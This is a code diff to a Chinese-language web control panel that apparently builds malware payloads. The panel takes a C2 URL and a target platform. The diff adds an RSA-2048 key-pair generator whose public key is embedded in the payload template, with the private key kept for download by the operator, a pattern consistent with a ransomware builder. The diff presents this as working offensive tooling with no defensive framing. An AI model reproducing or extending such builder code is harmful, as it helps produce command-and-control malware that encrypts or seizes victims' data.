@@ -99,7 +99,9 @@ $server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http'
 
 <div style="display:flex;gap:10px;margin-top:16px">
   <button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button>
+  <button class="btn btn-red" style="background:#10b981" onclick="genKey()"><i class="fas fa-key"></i> 生成RSA密钥对</button>
 </div>
+<div id="key-result" class="gen-result" style="margin-top:10px"></div>
 <div id="gen-result" class="gen-result" style="margin-top:16px"></div>
 </section>
 
@@ -194,6 +196,15 @@ function showTab(t){
   document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
   event.target.closest('.nav-item').classList.add('active');
 }
+function genKey(){
+  var r=document.getElementById('key-result');
+  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
+  fetch('keygen.php').then(x=>x.json()).then(d=>{
+    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="payloads/jasmin_private.pem" download class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="payloads/jasmin_public.pem" download class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a></div></div>';}
+    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
+  }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
+}
+
 function genPayload(){
   var p=document.getElementById('gen-platform').value;
   var c2=document.getElementById('c2url').value;
